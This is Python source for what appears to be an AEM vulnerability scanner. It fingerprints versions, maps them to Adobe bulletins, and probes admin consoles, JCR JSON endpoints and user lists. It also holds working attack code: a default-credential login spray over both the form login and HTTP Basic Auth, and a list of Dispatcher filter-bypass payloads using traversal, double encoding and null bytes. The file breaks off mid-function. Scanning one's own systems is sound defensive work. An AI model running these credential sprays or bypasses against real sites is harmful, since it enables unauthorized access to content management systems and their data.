import httpx
import asyncio
import json
import re
from urllib.parse import urlparse


# ─── Protocol Detection ────────────────────────────────────────────────────────

async def detect_protocol(scan_address, port, timeout=3):
    """Detect HTTP or HTTPS for the target."""
    for protocol in ['https', 'http']:
        try:
            async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
                r = await client.get(f"{protocol}://{scan_address}:{port}/")
                if r.status_code in [200, 401, 403, 302, 404]:
                    return protocol
        except Exception:
            continue
    return 'http'


# ─── Version Utilities ─────────────────────────────────────────────────────────

def parse_version(version_string):
    try:
        m = re.match(r'^(\d+(?:\.\d+)*)', str(version_string).strip())
        if not m:
            return (0,)
        return tuple(int(p) for p in m.group(1).split('.'))
    except Exception:
        return (0,)


def compare_versions(v1, v2):
    a, b = parse_version(v1), parse_version(v2)
    n = max(len(a), len(b))
    a += (0,) * (n - len(a))
    b += (0,) * (n - len(b))
    return -1 if a < b else (1 if a > b else 0)


def is_version_affected(current, ranges):
    if not current:
        return False
    try:
        for r in ranges:
            if r.startswith('<'):
                if compare_versions(current, r[1:]) < 0:
                    return True
            elif '>=' in r and '<' in r:
                parts = r.split(',')
                lo = parts[0][2:]
                hi = parts[1][1:]
                if compare_versions(current, lo) >= 0 and compare_versions(current, hi) < 0:
                    return True
    except Exception:
        pass
    return False


def extract_service_pack(text):
    """Extract an AEM service-pack number from free-form text."""
    if not text:
        return None
    match = re.search(r'(?:service\s*pack|sp)\s*([0-9]{1,2})', text, re.IGNORECASE)
    if match:
        try:
            return int(match.group(1))
        except ValueError:
            return None
    return None


def build_version_info(number=None, source=None, raw_text=''):
    """Normalise AEM version metadata into one structure."""
    info = {}
    if number:
        info['number'] = number
    if source:
        info['source'] = source

    text = raw_text or ''
    lower = text.lower()

    if 'cloud service' in lower:
        info['track'] = 'cloud-service'
        info['label'] = 'AEM Cloud Service'
        return info

    if 'lts' in lower:
        info['track'] = '6.5-lts'
        sp = extract_service_pack(text)
        if sp is not None:
            info['service_pack'] = sp
            info['label'] = f'AEM 6.5 LTS SP{sp}'
        elif number:
            info['label'] = f'AEM 6.5 LTS ({number})'
        else:
            info['label'] = 'AEM 6.5 LTS'
        return info

    if number and str(number).startswith('6.5.'):
        info['track'] = '6.5'
        info['label'] = f'AEM {number}'
    elif number:
        info['track'] = 'legacy'
        info['label'] = f'AEM {number}'
    return info


def looks_like_aem_login(text):
    lower = (text or '').lower()
    return any(marker in lower for marker in [
        'adobe experience manager',
        'j_security_check',
        'granite',
        'cq.shared',
        'coral-shell',
        'crx',
    ])


def looks_like_aem_admin(text):
    lower = (text or '').lower()
    return any(marker in lower for marker in [
        'apache felix web console',
        'system/console',
        'crxde lite',
        'crx package manager',
        'groovy console',
        'aem start',
        'sites',
        'assets',
    ])


def is_full_url(value):
    if not isinstance(value, str):
        return False
    return value.startswith("http://") or value.startswith("https://")


def response_looks_like_json(response):
    content_type = response.headers.get("content-type", "").lower()
    text = response.text.strip()
    return "json" in content_type or text.startswith("{") or text.startswith("[")


def text_has_jcr_fingerprint(text):
    body_lower = (text or "").lower()
    return any(key.lower() in body_lower for key in JCR_FINGERPRINT_KEYS)


def text_has_aem_header_fingerprint(headers):
    if not headers:
        return False
    for hdr in ["Server", "X-Powered-By", "X-Generator"]:
        value = headers.get(hdr, "")
        lower = value.lower()
        if any(marker in lower for marker in ["aem", "adobe experience manager", "apache sling", "crx"]):
            return True
    return False


def build_target_context(target_obj, port, protocol=None):
    scan_address = target_obj["scan_address"]
    display_target = target_obj.get("display_target", scan_address)

    supplied_url = None
    for candidate in [display_target, scan_address]:
        if is_full_url(candidate):
            supplied_url = candidate
            break

    parsed = urlparse(supplied_url) if supplied_url else None
    supplied_path = ""
    origin_url = None

    if parsed and parsed.netloc:
        supplied_path = parsed.path or ""
        origin_url = f"{parsed.scheme}://{parsed.netloc}"

    if not origin_url:
        chosen_protocol = protocol or "http"
        origin_url = f"{chosen_protocol}://{scan_address}:{port}"

    return {
        "origin_url": origin_url.rstrip("/"),
        "supplied_url": supplied_url,
        "supplied_path": supplied_path.rstrip("/"),
        "display_target": display_target,
        "scan_address": scan_address,
        "port": port,
    }


def derive_path_prefixes(path):
    if not path or path == "/":
        return []

    parts = [part for part in path.strip("/").split("/") if part]
    if not parts:
        return []

    prefixes = []
    for length in [len(parts), len(parts) - 1, 2, 1]:
        if length <= 0 or length > len(parts):
            continue
        prefix = "/" + "/".join(parts[:length])
        if prefix not in prefixes:
            prefixes.append(prefix)
    return prefixes


def build_extra_jcr_probe_urls(target_context):
    supplied_url = target_context.get("supplied_url")
    if not supplied_url:
        return []

    parsed = urlparse(supplied_url)
    if not parsed.scheme or not parsed.netloc or not parsed.path or parsed.path == "/":
        return []

    origin = f"{parsed.scheme}://{parsed.netloc}"
    probe_urls = [supplied_url]
    for prefix in derive_path_prefixes(parsed.path):
        if prefix.endswith(".json"):
            candidates = [prefix]
        else:
            candidates = [prefix, f"{prefix}.json", f"{prefix}.1.json", f"{prefix}.infinity.json"]
        for candidate in candidates:
            probe_url = f"{origin}{candidate}"
            if probe_url not in probe_urls:
                probe_urls.append(probe_url)
    return probe_urls


# ─── Security Intelligence ────────────────────────────────────────────────────

# Current Adobe release baselines verified on 2026-04-29.
AEM_VERSION_BASELINES = {
    "6.5": {"latest": "6.5.24.0", "released": "2025-11-26"},
    "6.5-lts": {"latest_sp": 2, "label": "6.5 LTS SP2", "released": "2026-02-19"},
}

# Security bulletins that materially change the defensive posture of AEM 6.5 / 6.5 LTS.
AEM_SECURITY_BULLETINS = [
    {
        "id": "APSB24-28",
        "published": "2024-06-11",
        "severity": "HIGH",
        "affected_versions": [">=6.5.0,<6.5.21"],
        "affected_lts_sp_max": None,
        "summary": "Critical improper access control plus numerous stored XSS and input-validation issues.",
        "cves": [
            "CVE-2024-26029", "CVE-2024-26036", "CVE-2024-26037",
            "CVE-2024-20769", "CVE-2024-26078",
        ],
    },
    {
        "id": "APSB24-69",
        "published": "2024-12-10",
        "severity": "HIGH",
        "affected_versions": [">=6.5.0,<6.5.22"],
        "affected_lts_sp_max": None,
        "summary": "Improper authorization and many stored XSS issues.",
        "cves": [
            "CVE-2024-43712", "CVE-2024-43713", "CVE-2024-43714", "CVE-2024-43729",
        ],
    },
    {
        "id": "APSB25-48",
        "published": "2025-06-10",
        "severity": "CRITICAL",
        "affected_versions": [">=6.5.0,<6.5.23"],
        "affected_lts_sp_max": None,
        "summary": "Privilege escalation, input validation leading to code execution, and multiple XSS issues.",
        "cves": [
            "CVE-2025-46840", "CVE-2025-46837", "CVE-2025-46838",
            "CVE-2025-46841", "CVE-2025-46857",
        ],
    },
    {
        "id": "APSB25-90",
        "published": "2025-09-09",
        "severity": "CRITICAL",
        "affected_versions": [">=6.5.0,<6.5.24"],
        "affected_lts_sp_max": 1,
        "summary": "Security feature bypass issues including authorization, SSRF, XPath injection, stored XSS, and input validation.",
        "cves": [
            "CVE-2025-54246", "CVE-2025-54247", "CVE-2025-54248",
            "CVE-2025-54249", "CVE-2025-54250", "CVE-2025-54251", "CVE-2025-54252",
        ],
    },
    {
        "id": "APSB26-24",
        "published": "2026-03-10",
        "severity": "HIGH",
        "affected_versions": [">=6.5.0,<6.5.24"],
        "affected_lts_sp_max": 1,
        "summary": "Multiple stored and DOM-based XSS issues in AEM 6.5 / 6.5 LTS.",
        "cves": [
            "CVE-2026-27223", "CVE-2026-27224", "CVE-2026-27225",
            "CVE-2026-27247", "CVE-2026-27262",
        ],
    },
]

# Only keep externally observable checks that can be supported by evidence from unauthenticated probing.
OBSERVABLE_CVE_CHECKS = {
    "CVE-2024-26029": {
        "description": "Improper access control around CRX Package Manager surfaces.",
        "severity": "CRITICAL",
        "affected_versions": [">=6.5.0,<6.5.21"],
        "payload": {"path": "/crx/packmgr/service.jsp?cmd=ls", "method": "GET"},
        "indicators": ["package", "packages", "buildcount", "downloadname"],
        "details": "Package Manager service responded without authentication. This is a strong indicator of package-management access-control weakness.",
    },
    "CVE-2021-21598": {
        "description": "Legacy CRX Package Manager authentication-bypass exposure.",
        "severity": "CRITICAL",
        "affected_versions": [">=6.2.0,<6.5.8"],
        "payload": {"path": "/crx/packmgr/index.jsp", "method": "GET"},
        "indicators": ["crx package manager", "package manager", "upload package"],
        "details": "Package Manager UI is reachable on an affected legacy version. Manual confirmation is still required.",
    },
    "CVE-2018-4939": {
        "description": "Legacy feedRenderer / xssprotect servlet exposure linked to SSRF-to-RCE chains.",
        "severity": "CRITICAL",
        "affected_versions": [">=6.0.0,<6.4.0"],
        "payload": {"path": "/bin/xssprotect/run?exec=true", "method": "GET"},
        "indicators": ["feedrenderer", "xssprotect", "exception", "error"],
        "details": "Legacy servlet is exposed on a pre-6.4 branch. Confirm exploitability manually.",
    },
}

VERSION_VULNERABILITIES = {
    "default_config_issues": {
        "description": "Default configuration vulnerabilities",
        "checks": [
            {
                "versions": ["<6.5.0"],
                "issue": "End-of-life AEM branch",
                "risk": "CRITICAL",
                "details": "AEM versions before 6.5 are end-of-life and no longer receive current Adobe security fixes.",
            },
        ],
    },
    "known_weaknesses": {
        "description": "Known security weaknesses by version",
        "checks": [
            {
                "versions": ["<6.4.0"],
                "issue": "Legacy demo and developer features may still be present",
                "risk": "HIGH",
                "details": "Older AEM branches commonly retain Geometrixx content, legacy servlets, and developer tooling that should be removed from production.",
            },
        ],
    },
}

# Sensitive paths to probe for exposure
SENSITIVE_PATHS = [
    # Admin / Developer Consoles (RCE risk)
    "/aem/start.html",
    "/sites.html",
    "/assets.html",
    "/projects.html",
    "/crx/de/index.jsp",
    "/crx/explorer/index.jsp",
    "/crx/packmgr/index.jsp",
    "/crx/packmgr/service.jsp?cmd=ls",
    "/crx/packmgr/list.jsp",
    "/system/console",
    "/system/console/bundles",
    "/system/console/configMgr",
    "/system/console/components",
    "/system/console/services",
    "/system/console/jmx",
    "/system/console/memoryusage",
    "/etc/groovyconsole",
    "/etc/groovyconsole.html",
    # Product / Version Info
    "/system/console/status-productinfo.json",
    "/system/console/status-productinfo",
    "/system/console/status-jre.json",
    "/system/console/status-osgi.json",
    "/libs/cq/core/content/welcome.html",
    # Content / Query APIs
    "/bin/querybuilder.json?path=/content&p.limit=1",
    "/bin/querybuilder.json?path=/home/users&type=rep:User&p.limit=1",
    "/bin/wcm/siteadmin/tree.json",
    "/content.json",
    "/content.infinity.json",
    "/content/dam.json",
    "/content/dam.infinity.json",
    "/content/dam.1.json",
    "/content/usergenerated.json",
    # Replication / Package Management
    "/etc/replication.html",
    "/etc/replication/agents.author.html",
    "/etc/replication/agents.publish.html",
    "/etc/packages.html",
    "/libs/granite/packaging/install.html",
    # User Enumeration
    "/home/users.json",
    "/home/groups.json",
    "/libs/granite/security/currentuser.json",
    "/libs/granite/security/content/useradmin.html",
    # AEM Forms
    "/content/forms/af.html",
    "/libs/fd/fm/content/manage.html",
    "/content/cq:graphql/global/endpoint.json",
    "/graphql/execute.json/global",
    # Classic UI
    "/siteadmin",
    "/damadmin",
    "/miscadmin",
    "/useradmin",
    # Login Pages
    "/libs/granite/core/content/login.html",
    "/libs/cq/core/content/login.html",
]

# Dispatcher bypass paths to test
DISPATCHER_BYPASS_PATHS = [
    "/crx/de/index.jsp.json",
    "/system/console.json",
    "/system/console/bundles.json",
    "/crx%2Fde/index.jsp",
    "/system%2Fconsole",
    "/content/dam/../../../crx/de/index.jsp",
    "/content/geometrixx/../../../system/console",
    "/crx/de/index.jsp/a.css",
    "/crx/de/index.jsp/a.html",
    "/system/console/a.png",
    "/crx///de/index.jsp",
    "/crx/./de/index.jsp",
    # ── Semicolon Bypass (CVE-2016-0957 variants) ──────────────────────────────
    # Sling parses URLs differently from Apache — semicolons can fool Dispatcher regex
    "/content/sitename/..;/..;/..;/crx/de/index.jsp",
    "/system/console.configMgr/..;/..;/",
    "/crx/de/index.jsp;%0a",
    "/crx/de/index.jsp;.html",
    # ── Extension Fuzzing ──────────────────────────────────────────────────────
    # Dispatcher often passes .html/.css/.ico — Sling resolves the real path first
    "/system/console.css",
    "/system/console.ico",
    "/crx/packmgr/index.jsp.html",
    "/crx/de/index.jsp.css",
    "/system/console/bundles.1.json",
    # ── Null Byte & Double Encoding ────────────────────────────────────────────
    "/crx/de/index.jsp%00",
    "/crx%252Fde/index.jsp",
    "/system%252Fconsole",
    "/%2e%2e/%2e%2e/%2e%2e/crx/de/index.jsp",
    "/%252e%252e/%252e%252e/system/console",
]

# JCR metadata keys that prove AEM is behind the response
# If ANY of these appear in a JSON body, the node is from AEM's JCR repository
JCR_FINGERPRINT_KEYS = [
    "jcr:primaryType",
    "jcr:mixinTypes",
    "jcr:content",
    "jcr:uuid",
    "jcr:createdBy",
    "jcr:lastModifiedBy",
    "sling:resourceType",
    "sling:resourceSuperType",
    "cq:tags",
    "cq:Taggable",
    "cq:lastReplicatedBy",
    "dam:assetState",
    "dam:cfVariationNode",
    "nt:unstructured",
    "nt:folder",
    "rep:User",
]

ANONYMOUS_PII_KEYS = [
    "jcr:createdBy",
    "jcr:lastModifiedBy",
    "cq:lastReplicatedBy",
    "rep:principalName",
    "rep:authorizableId",
    "profile/email",
    "profile/givenName",
    "profile/familyName",
]

# Common patterns for unauthenticated JCR/content-serving endpoints
# These are paths that custom AEM servlets or BFF layers often expose
JCR_PROBE_PATHS = [
    # Standard Sling GET servlet — appending .json to any JCR path returns raw node data
    "/content.json",
    "/content/dam.json",
    "/content/we-retail.json",
    "/content/geometrixx.json",
    "/content/campaigns.json",
    "/content/usergenerated.json",
    "/etc.json",
    "/var.json",
    "/apps.json",
    "/home.json",
    "/home/users.json",
    "/home/groups.json",
    # Infinity selectors — dump entire subtree recursively
    "/content.infinity.json",
    "/content/dam.infinity.json",
    "/etc.infinity.json",
    "/conf.infinity.json",
    # Numbered depth selectors
    "/content.1.json",
    "/content.2.json",
    "/content/dam.1.json",
    "/content/dam.2.json",
    # Common BFF / headless API proxy patterns
    # These proxy AEM JCR paths behind a custom route — same leak, different URL shape
    "/api/content.json",
    "/api/jcr/content.json",
    "/getContent/content",
    "/aem/content.json",
    "/proxy/content.json",
    "/content-api/content.json",
    # Content Fragment / GraphQL adjacent
    "/content/experience-fragments.json",
    "/content/experience-fragments.infinity.json",
    "/content/cq:graphql/global/endpoint.json",
    "/content/_cq_graphql/global/endpoint.json",
    "/conf/global/settings/cloudconfigs.json",
    "/conf.json",
    # Environment / config nodes often stored in JCR
    "/content/storefront-config.json",
    "/content/logging-config.json",
    "/content/app-config.json",
    "/content/feature-flags.json",
]


# ─── AEM Version Detection ─────────────────────────────────────────────────────

async def get_aem_version(target_url, extra_probe_urls=None):
    """Extract AEM version from multiple endpoints."""
    def extract_from_text(body, source):
        body = body or ''

        lts_match = re.search(r'6\.5\s*LTS(?:\s*(?:Service\s*Pack|SP)\s*([0-9]{1,2}))?', body, re.IGNORECASE)
        if lts_match:
            info = build_version_info(source=source, raw_text=body)
            sp = lts_match.group(1)
            if sp:
                info['service_pack'] = int(sp)
                info['label'] = f"AEM 6.5 LTS SP{sp}"
            return info

        version_patterns = [
            r'Adobe Experience Manager[,\s:]+([0-9]+\.[0-9]+(?:\.[0-9]+){1,2})',
            r'"(?:productVersion|version|number)"\s*:\s*"([0-9]+\.[0-9]+(?:\.[0-9]+){1,2})"',
            r'\b(6\.5\.[0-9]+(?:\.[0-9]+)?)\b',
            r'\b(6\.[0-9]+\.[0-9]+(?:\.[0-9]+)?)\b',
        ]
        for pattern in version_patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return build_version_info(number=match.group(1), source=source, raw_text=body)

        if 'cloud service' in body.lower():
            return build_version_info(source=source, raw_text=body)
        return None

    version_info = None
    endpoints = [
        "/system/console/status-productinfo.json",
        "/system/console/status-productinfo",
        "/system/console/productinfo",
        "/libs/cq/core/content/welcome.html",
        "/libs/granite/core/content/login.html",
        "/libs/cq/core/content/login.html",
    ]

    try:
        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
            for probe_url in extra_probe_urls or []:
                try:
                    r = await client.get(probe_url, timeout=5)
                    if r.status_code != 200:
                        continue
                    info = extract_from_text(r.text, probe_url)
                    if info and (info.get('number') or info.get('track')):
                        return info
                    if text_has_jcr_fingerprint(r.text) and not version_info:
                        version_info = {"source": probe_url, "track": "unknown", "label": "AEM detected"}
                except Exception:
                    continue

            for endpoint in endpoints:
                try:
                    r = await client.get(f"{target_url}{endpoint}", timeout=5)
                    if r.status_code != 200:
                        continue
                    info = extract_from_text(r.text, endpoint)
                    if info and (info.get('number') or info.get('track')):
                        return info
                    if looks_like_aem_login(r.text) and not version_info:
                        version_info = {"source": endpoint, "track": "unknown", "label": "AEM detected"}
                except Exception:
                    continue

            r = await client.get(f"{target_url}/", timeout=5)
            root_body = r.text or ''
            for hdr in ['Server', 'X-Powered-By', 'X-Generator']:
                val = r.headers.get(hdr, '')
                if not val:
                    continue
                info = extract_from_text(val, f'header:{hdr}')
                if info and (info.get('number') or info.get('track')):
                    return info

            root_info = extract_from_text(root_body, '/')
            if root_info and (root_info.get('number') or root_info.get('track')):
                return root_info

            if looks_like_aem_login(root_body) and not version_info:
                version_info = {"source": "/", "track": "unknown", "label": "AEM detected"}
    except Exception:
        pass

    return version_info


async def identify_aem_target(target_url, extra_probe_urls=None, version_info=None):
    """
    Decide whether the target is AEM with enough confidence to run AEM-specific checks.
    """
    evidence = []
    score = 0

    if version_info and (version_info.get("number") or version_info.get("track")):
        evidence.append(version_info.get("label") or version_info.get("number") or "version signal")
        score += 3

    endpoints = [
        ("/libs/granite/core/content/login.html", "login"),
        ("/libs/cq/core/content/login.html", "classic-login"),
        ("/system/console/status-productinfo.json", "productinfo"),
        ("/crx/de/index.jsp", "crxde"),
        ("/content.json", "content-json"),
        ("/conf.json", "conf-json"),
        ("/content/cq:graphql/global/endpoint.json", "graphql"),
    ]

    try:
        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
            try:
                root = await client.get(f"{target_url}/", timeout=5)
                if text_has_aem_header_fingerprint(root.headers):
                    evidence.append("AEM/Sling headers")
                    score += 2
                if looks_like_aem_login(root.text) or looks_like_aem_admin(root.text):
                    evidence.append("AEM root HTML markers")
                    score += 2
            except Exception:
                pass

            for endpoint, label in endpoints:
                try:
                    r = await client.get(f"{target_url}{endpoint}", timeout=5)
                except Exception:
                    continue

                if r.status_code == 200:
                    if label in {"login", "classic-login"} and looks_like_aem_login(r.text):
                        evidence.append(label)
                        score += 2
                    elif label == "productinfo" and "adobe experience manager" in r.text.lower():
                        evidence.append(label)
                        score += 3
                    elif label == "crxde" and any(k in r.text.lower() for k in ["crxde", "repository", "jcr"]):
                        evidence.append(label)
                        score += 2
                    elif label in {"content-json", "conf-json"} and response_looks_like_json(r) and text_has_jcr_fingerprint(r.text):
                        evidence.append(label)
                        score += 3
                    elif label == "graphql" and any(k in r.text.lower() for k in ["graphql", "endpoint", "__schema"]):
                        evidence.append(label)
                        score += 2
                elif label == "crxde" and r.status_code in (401, 403):
                    evidence.append("crxde-protected")
                    score += 1

            for probe_url in extra_probe_urls or []:
                try:
                    r = await client.get(probe_url, timeout=5)
                except Exception:
                    continue

                if r.status_code != 200:
                    continue
                if response_looks_like_json(r) and text_has_jcr_fingerprint(r.text):
                    evidence.append(f"path-jcr:{probe_url}")
                    score += 3
                    continue
                if looks_like_aem_login(r.text) or looks_like_aem_admin(r.text):
                    evidence.append(f"path-html:{probe_url}")
                    score += 2
    except Exception:
        pass

    evidence = list(dict.fromkeys(evidence))
    return {
        "identified": score >= 3,
        "score": score,
        "evidence": evidence[:8],
    }


# ─── CVE Payload Testing ───────────────────────────────────────────────────────

async def test_cve_payload(target_url, cve_id, cve_data):
    """Test a small set of externally observable AEM issues."""
    payload = cve_data["payload"]
    test_url = f"{target_url}{payload['path']}"
    try:
        async with httpx.AsyncClient(timeout=10, verify=False, follow_redirects=True) as client:
            if payload["method"] == "GET":
                r = await client.get(test_url, timeout=6)
            elif payload["method"] == "POST":
                r = await client.post(test_url, json=payload.get("data", {}), timeout=6)
            else:
                return None
            text = r.text.lower()
            indicators = cve_data.get("indicators", [])
            if r.status_code == 200 and (not indicators or any(k in text for k in indicators)):
                return {
                    "status": "VULNERABLE",
                    "vulnerability": f"{cve_id} - {cve_data['description']}",
                    "target": test_url,
                    "details": cve_data["details"],
                }
            if r.status_code in (301, 302) and cve_id in ("CVE-2024-26029", "CVE-2021-21598"):
                return {
                    "status": "POTENTIAL",
                    "vulnerability": f"{cve_id} - {cve_data['description']}",
                    "target": test_url,
                    "details": "Package Manager surface redirected. Verify whether authentication and Dispatcher filtering are consistently enforced.",
                }
    except Exception:
        pass
    return None


# ─── Version Vulnerability Check ──────────────────────────────────────────────

async def check_version_vulnerabilities(target_url, version_info):
    """Check for version-based risks and EOL warnings."""
    vulns = []
    if not version_info:
        return vulns

    ver = version_info.get('number')
    track = version_info.get('track')
    label = version_info.get('label') or ver or 'Unknown'

    if track == '6.5-lts':
        sp = version_info.get('service_pack')
        latest_sp = AEM_VERSION_BASELINES["6.5-lts"]["latest_sp"]
        if sp is not None and sp < latest_sp:
            vulns.append({
                "status": "VULNERABLE",
                "vulnerability": "AEM 6.5 LTS Behind Adobe Security Baseline",
                "target": target_url,
                "details": (
                    f"Detected {label}. Current Adobe baseline is {AEM_VERSION_BASELINES['6.5-lts']['label']} "
                    f"(released {AEM_VERSION_BASELINES['6.5-lts']['released']})."
                ),
            })
        return vulns

    if not ver:
        return vulns

    for cat in VERSION_VULNERABILITIES.values():
        for check in cat['checks']:
            if is_version_affected(ver, check['versions']):
                vulns.append({
                    "status": "VULNERABLE",
                    "vulnerability": f"AEM Version Risk - {check['issue']}",
                    "target": target_url,
                    "details": f"Version {ver}: {check['details']} (Risk: {check['risk']})",
                })

    latest = AEM_VERSION_BASELINES["6.5"]["latest"]
    if ver.startswith('6.5.') and compare_versions(ver, latest) < 0:
        vulns.append({
            "status": "VULNERABLE",
            "vulnerability": "AEM 6.5 Behind Adobe Security Baseline",
            "target": target_url,
            "details": (
                f"Detected AEM {ver}. Current Adobe baseline is {latest} "
                f"(released {AEM_VERSION_BASELINES['6.5']['released']})."
            ),
        })
    return vulns


# ─── CVE Vulnerability Check ──────────────────────────────────────────────────

async def check_cve_vulnerabilities(target_url, version_info=None):
    """Map detected version to Adobe bulletins, plus a small number of observable CVE checks."""
    vulns = []
    if version_info is None:
        version_info = await get_aem_version(target_url)
    ver = version_info.get('number') if version_info else None
    track = version_info.get('track') if version_info else None
    if version_info:
        vulns.extend(await check_version_vulnerabilities(target_url, version_info))

        for bulletin in AEM_SECURITY_BULLETINS:
            applies = False
            if track == '6.5-lts':
                sp = version_info.get('service_pack')
                max_sp = bulletin.get('affected_lts_sp_max')
                applies = sp is not None and max_sp is not None and sp <= max_sp
            elif ver:
                applies = is_version_affected(ver, bulletin["affected_versions"])

            if applies:
                vulns.append({
                    "status": "POTENTIAL",
                    "severity": bulletin["severity"],
                    "vulnerability": f"Adobe Security Bulletin {bulletin['id']} applies to detected AEM version",
                    "target": target_url,
                    "details": (
                        f"{bulletin['id']} ({bulletin['published']}): {bulletin['summary']} "
                        f"Representative CVEs: {', '.join(bulletin['cves'])}. "
                        "Most items in this bulletin are not safely confirmable via unauthenticated HTTP probing alone."
                    ),
                })

    for cve_id, cve_data in OBSERVABLE_CVE_CHECKS.items():
        version_match = bool(ver and is_version_affected(ver, cve_data["affected_versions"]))
        result = await test_cve_payload(target_url, cve_id, cve_data)
        if not result:
            continue

        result['severity'] = cve_data.get('severity', 'UNKNOWN')
        if version_match:
            vulns.append(result)
            continue

        if ver:
            vulns.append({
                "status": "INFO",
                "severity": cve_data.get('severity', 'UNKNOWN'),
                "vulnerability": f"Observable AEM Security Surface Exposed ({cve_id} path)",
                "target": result["target"],
                "details": (
                    f"{result['details']} Detected response on {cve_data['payload']['path']}, "
                    f"but identified version {ver} is not in the advisory range for {cve_id}. "
                    "Treat this as exposed attack surface rather than CVE confirmation."
                ),
            })
        else:
            vulns.append({
                "status": "POTENTIAL",
                "severity": cve_data.get('severity', 'UNKNOWN'),
                "vulnerability": f"Observable AEM Security Surface Exposed ({cve_id} path)",
                "target": result["target"],
                "details": (
                    f"{result['details']} Version could not be determined, so this is not attributed "
                    f"to {cve_id} yet. The response still indicates exposed AEM functionality."
                ),
            })
    return vulns


# ─── Default Credential Check ─────────────────────────────────────────────────

async def check_default_credentials(target_url):
    """Try common AEM default credentials via j_security_check."""
    creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "Admin1"),
        ("admin", "aem"), ("admin", "adobe"), ("admin", "admin123"),
        ("author", "author"), ("publish", "publish"),
        ("replication-receiver", "replication-receiver"),
        ("dispatcher", "dispatcher"), ("metrics", "metrics"),
        ("test", "test"), ("guest", "guest"), ("anonymous", "anonymous"),
        ("aemadmin", "aemadmin"), ("cqadmin", "cqadmin"),
    ]
    for login_path in ["/libs/granite/core/content/login.html", "/libs/cq/core/content/login.html"]:
        login_url = f"{target_url}{login_path}"
        try:
            async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=10) as client:
                r = await client.get(login_url, timeout=6)
                if r.status_code != 200:
                    continue
                if not any(k in r.text.lower() for k in ["granite", "cq", "adobe experience", "aem"]):
                    continue
                for username, password in creds:
                    try:
                        data = {
                            "j_username": username, "j_password": password,
                            "j_charset": "UTF-8", "_charset_": "UTF-8",
                        }
                        resp = await client.post(f"{target_url}/j_security_check", data=data, timeout=6)
                        final = str(resp.url)
                        if resp.status_code in (200, 302) and "login" not in final.lower():
                            return {
                                "status": "VULNERABLE",
                                "vulnerability": f"AEM Default Credentials ({username}:{password})",
                                "target": login_url,
                                "details": f"Authenticated with {username}:{password}. Full CMS access granted.",
                            }
                        await asyncio.sleep(0.3)
                    except httpx.RequestError:
                        continue
        except Exception:
            pass

    # ── HTTP Basic Auth bypass ─────────────────────────────────────────────────────
    # OSGi console and WebDAV accept Basic Auth directly — bypasses the login form flow
    basic_auth_targets = [
        "/system/console",
        "/system/console/bundles",
        "/crx/server/crx.default/jcr:root/",
        "/dav/default",
    ]
    for username, password in creds[:8]:  # limit to top 8 for speed
        import base64
        token = base64.b64encode(f"{username}:{password}".encode()).decode()
        headers = {"Authorization": f"Basic {token}"}
        for path in basic_auth_targets:
            try:
                async with httpx.AsyncClient(verify=False, timeout=6) as client:
                    r = await client.get(f"{target_url}{path}", headers=headers)
                    if r.status_code == 200:
                        text = r.text.lower()
                        if any(k in text for k in ["osgi", "felix", "bundle", "console", "jcr", "sling"]):
                            return {
                                "status": "VULNERABLE",
                                "vulnerability": f"AEM Basic Auth Default Credentials ({username}:{password})",
                                "target": f"{target_url}{path}",
                                "details": (
                                    f"HTTP Basic Auth with {username}:{password} succeeded on {path}. "
                                    f"OSGi/WebDAV interfaces accept credentials directly without the login form."
                                ),
                            }
            except Exception:
                continue

    return None


# ─── Sensitive Path Checks ────────────────────────────────────────────────────

async def check_sensitive_paths(target_url):
    """Check for unauthenticated access to AEM admin and sensitive paths."""
    HIGH_RISK = {
        "/crx/de/index.jsp", "/crx/packmgr/index.jsp", "/crx/packmgr/service.jsp?cmd=ls",
        "/system/console", "/etc/groovyconsole", "/etc/groovyconsole.html",
        "/aem/start.html", "/sites.html", "/assets.html",
    }
    accessible, critical = [], []

    async def probe(client, path):
        try:
            r = await client.get(f"{target_url}{path}", timeout=5)
            if r.status_code == 200:
                if looks_like_aem_admin(r.text):
                    return path
                if response_looks_like_json(r) and (
                    text_has_jcr_fingerprint(r.text)
                    or "adobe experience manager" in r.text.lower()
                    or "querybuilder" in r.text.lower()
                ):
                    return path
            if r.status_code in (301, 302):
                loc = r.headers.get("location", "")
                if any(marker in loc.lower() for marker in [
                    "crx", "system/console", "groovyconsole", "aem/start", "sites.html", "assets.html"
                ]):
                    return path
        except Exception:
            pass
        return None

    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            results = await asyncio.gather(*[probe(client, p) for p in SENSITIVE_PATHS])
            for p in results:
                if p:
                    accessible.append(p)
                    if p in HIGH_RISK:
                        critical.append(p)
    except Exception:
        pass

    vulns = []
    if critical:
        vulns.append({
            "status": "VULNERABLE",
            "vulnerability": "AEM Critical Admin Console Exposed",
            "target": target_url,
            "details": (
                f"HIGH-RISK admin consoles accessible without authentication: "
                f"{', '.join(critical)}. "
                "RCE possible via package upload (packmgr), OSGi bundle install (system/console), "
                "or arbitrary Groovy code execution."
            ),
        })
    non_crit = [p for p in accessible if p not in critical]
    if non_crit:
        extra = "..." if len(non_crit) > 8 else ""
        vulns.append({
            "status": "VULNERABLE",
            "vulnerability": "AEM Sensitive Paths Exposed",
            "target": target_url,
            "details": (
                f"{len(non_crit)} sensitive path(s) accessible without authentication: "
                f"{', '.join(non_crit[:8])}{extra}"
            ),
        })
    return vulns


# ─── Dispatcher Bypass Check ──────────────────────────────────────────────────

async def check_dispatcher_bypass(target_url):
    """Test common AEM Dispatcher filter bypass techniques."""
    bypassed = []

    async def probe_bypass(client, path):
        try:
            r = await client.get(f"{target_url}{path}", timeout=5)
            if r.status_code == 200:
                text = r.text.lower()
                if any(k in text for k in ["crx", "osgi", "sling", "felix", "groovy", "package"]):
                    return path
        except Exception:
            pass
        return None

    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            results = await asyncio.gather(*[probe_bypass(client, p) for p in DISPATCHER_BYPASS_PATHS])
            bypassed = [r for r in results if r]
    except Exception:
        pass

    if bypassed:
        extra = "..." if len(bypassed) > 5 else ""
        return {
            "status": "VULNERABLE",
            "vulnerability": "AEM Dispatcher Filter Bypass",
            "target": target_url,
            "details": (
                f"Dispatcher security filters bypassed via {len(bypassed)} path(s): "
                f"{', '.join(bypassed[:5])}{extra}. "
